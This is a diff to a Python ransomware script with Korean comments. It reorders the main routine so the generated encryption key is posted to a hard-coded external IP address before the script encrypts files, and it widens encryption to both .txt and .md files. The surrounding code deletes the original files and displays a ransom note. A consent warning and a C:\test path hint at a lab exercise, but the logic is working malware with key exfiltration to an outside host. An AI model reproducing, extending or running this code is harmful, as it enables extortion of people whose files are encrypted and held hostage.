@@ -8,10 +8,10 @@ def main():
     warning()
     
     encryption_key=generate_encryption_key()
-    search_and_encrypt_files(key=encryption_key,path="C:\\test",extension=".txt")
-    
     your_id=make_id()
     send_key(f"{your_id} : {encryption_key.decode()}")
+    
+    search_and_encrypt_files(key=encryption_key,path="C:\\test",extension=(".txt",".md"))
     create_and_display_ransom_note(your_id)
 
     if 1==0:
@@ -29,7 +29,7 @@ def generate_encryption_key(length=32):
     encoded_key=base64.urlsafe_b64encode(byte_secret_token)
     return encoded_key
 
-def search_and_encrypt_files(key,path="C:\\test",extension=".txt"):
+def search_and_encrypt_files(key,path="C:\\test",extension=(".txt")):
     """
     @breif : 시스템 내 파일 탐색 및 암호화 실행
     @param key : SHA256 방식으로 암호화할 키
@@ -68,7 +68,7 @@ def search_and_encrypt_files(key,path="C:\\test",extension=".txt"):
         os.remove(filename)
         return
 
-    files=search_file(path,extension)
+    files=search_file(path,*extension)
     for file in files:
         encrypt_file(file)
     return
@@ -148,11 +148,14 @@ def send_key(text):
     @param : 전송할 메시지
     @return : None
     """
-    url = 'http://180.64.207.217:9999//write.php'
-    data = {'message': text}
-    response = requests.post(url, data=data)
-    print(response.text)
-    return
+    try:
+        url = 'http://180.64.207.217:9999//write.php'
+        data = {'message': text}
+        requests.post(url, data=data)
+        return
+    except:
+        exit(-1)
+    
 
 def warning():
     print("================================== 주의사항 ==================================")
@@ -167,7 +170,7 @@ def warning():
     print("계속 진행하시려면 아래 문장을 정확히 입력해주세요.")
     consent=input("주의사항을 숙지하였습니다\n")
     if consent.replace(" ","")!='주의사항을숙지하였습니다':
-        exit(-1)
+        exit(0)
 
 if __name__ == "__main__":
     main()
